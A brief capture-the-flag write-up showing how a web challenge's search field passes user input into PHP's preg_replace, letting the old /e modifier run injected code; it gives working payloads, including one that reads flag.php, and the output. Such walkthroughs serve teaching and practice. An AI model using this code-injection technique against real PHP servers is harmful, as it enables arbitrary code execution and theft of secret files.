The goal is to read flag.php

We see that if we do not put something looking like /regex/ in the "search" field, we have the following warning:

```
Warning: preg_replace(): Delimiter must not be alphanumeric or backslash in /challenge/web-serveur/ch37/index.php on line 25
```

That means we can specify any option for our regex. (/regex/i) makes it non case-sensitive.
The preg_replace() function has an interesting property (in old PHP versions). This is /regex/e. It replace the regex by a value returned by some arbitrary code put in replace.

For example:

```
preg_replace("/a/e","print(123)","abcd");
```
will return "123bcd", because a has been replaced by the result of print(123).

So with
```
echo preg_replace("/a/e","file_get_contents('flag.php')","abcd");
```

we will be able to see the contents of the flag.php file.

```
<?php $flag="FLAG"; ?> bcd
```
